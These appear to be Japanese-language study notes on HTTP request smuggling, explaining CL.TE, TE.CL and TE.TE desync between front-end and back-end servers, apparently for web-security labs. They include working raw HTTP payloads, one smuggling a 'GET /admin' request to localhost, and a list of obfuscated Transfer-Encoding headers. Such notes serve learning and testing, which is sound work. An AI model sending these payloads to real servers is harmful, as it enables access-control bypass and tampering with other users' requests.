## CL.TE脆弱性

###### 基本概念

- フロントエンドサーバはCLヘッダを処理し、メッセージbodyが13 bytesの長さであると認識し、1つのリクエストとしてバックエンドサーバに転送する
- 対して、バックエンドは==TEヘッダを処理し、`0`でデータの終了==とみなし、`SMUGGLED`は処理されずに残る。
- バックエンドは`SMUGGLED`を次のリクエストの開始として扱う

###### PoC

- 💡CL.TEの場合は密輸でない方のリクエストの`CL`が長いことを念頭にcheatsheetを読む

```http
POST / HTTP/1.1
Host: TARGET_NET
Content-Length: <content-length> //update-content-lengthにより自動で変更される
Transfer-Encoding: chunked

3
abc
0

SMUGGLED
```
- 具体例
```http
POST / HTTP/1.1
Host: TARGET_NET
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-Encoding: chunked

3
abc
0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 3

x=
```
- 💡`x=`によって続くリクエストがお尻にくっつく`x=GET / HTTP/1.1~`
	- そのために、二番目の`Content-Length`は`x=`(2バイト)より+1大きくした

## TE.CL脆弱性

###### 基本概念

- フロントエンドサーバはTEヘッダを処理し、メッセージボディをチャンクエンコーディングされたデータとして扱う
- SMUGGLEDに続く行の開始まで、8バイト長であると述べられている最初のチャンクを処理する。続く行は0なのでリクエストの終了とみなす

- バックエンドはCLヘッダを処理し、ボディが3バイトの長さで8に続く行の先頭までであると決定する
- SMUGGLEDで始まる次のバイトは処理されずに残され、バックエンドサーバはこれらを次のリクエストの開始として扱う
- "error":"Invalid request"はTE.CL脆弱性の兆候
- ==Transfer-Encodingは0までをリクエストとみなす==

###### PoC

- `<chunk-size>`は青ハイライト部分(`\r\n`含む)のSelection sizeの16進数(`0x..`)の方を記載する(この場合は54)

- `<content-length>`は青ハイライト部分(`\r\n`含む)のSelection sizeの10進数の方を記載する(この場合は4)
	- 💡TE.CLの場合は密輸でない方のリクエストの`CL`が短いことを念頭にcheatsheetを読む
![[Pasted image 20240222190005.png | 300]]![[Pasted image 20240222191417.png | 200]]

## TE.TE脆弱性

###### 基本概念

- TEヘッダを難読化する方法はいくらでもある：
```
Transfer-Encoding: xchunked
```
```
Transfer-Encoding : chunked
```
```
Transfer-Encoding: chunked
Transfer-Encoding: x
```
```
Transfer-Encoding:[tab]chunked
```
```
[space]Transfer-Encoding: chunked
```
```
X: X[\n]Transfer-Encoding: chunked
```
```
Transfer-Encoding
: chunked
```
- これらのテクニックはそれぞれ、HTTP仕様からの微妙に逸脱する。
- プロトコルの仕様を実装する実世界のコードが、その仕様に絶対的な精度で忠実であることは稀であり、実装が異なれば仕様から異なるバリエーションを許容することはよくあること

- TE.TE 脆弱性を発見するためには、フロントエンドまたはバックエンドサーバの一方だけが TEヘッダを処理し、もう一方のサーバはそれを無視するような、TEヘッダのバリエーションを見つける必要がある
- 難読化されたTEヘッダを処理しないように誘導できるのがフロントエンドかバックエンドサーバかによって、残りの攻撃はすでに説明した CL.TE 脆弱性や TE.CL 脆弱性と同じ形になる
